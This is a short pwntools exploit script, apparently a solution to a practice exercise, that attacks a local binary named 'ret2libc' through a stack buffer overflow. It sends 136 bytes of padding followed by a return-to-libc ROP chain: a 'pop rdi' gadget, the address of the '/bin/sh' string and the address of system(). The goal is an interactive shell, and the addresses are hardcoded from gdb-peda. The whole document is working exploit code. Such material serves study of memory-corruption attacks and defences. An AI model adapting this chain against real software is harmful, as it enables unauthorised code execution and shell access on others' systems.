from pwn import *

BIN = "./ret2libc"
context.binary = BIN

# gdb-peda$ p system
system_addr = 0x7ffff7c50d60

# gdb-peda$  find "/bin/sh"
binsh_addr = 0x7ffff7dd8698

# use peda, or a toop like ropper, ROPgadget etc.
poprdi = 0x00005555555551be

 
#0x00005555555551be
# static analysis or pattc+patto from peda
ret_offset = 136

payload = b""
payload += ret_offset * b"A"
payload += pack(poprdi)
payload += pack(binsh_addr)
payload += pack(system_addr)

io = process(BIN)
io.send(payload)
io.interactive()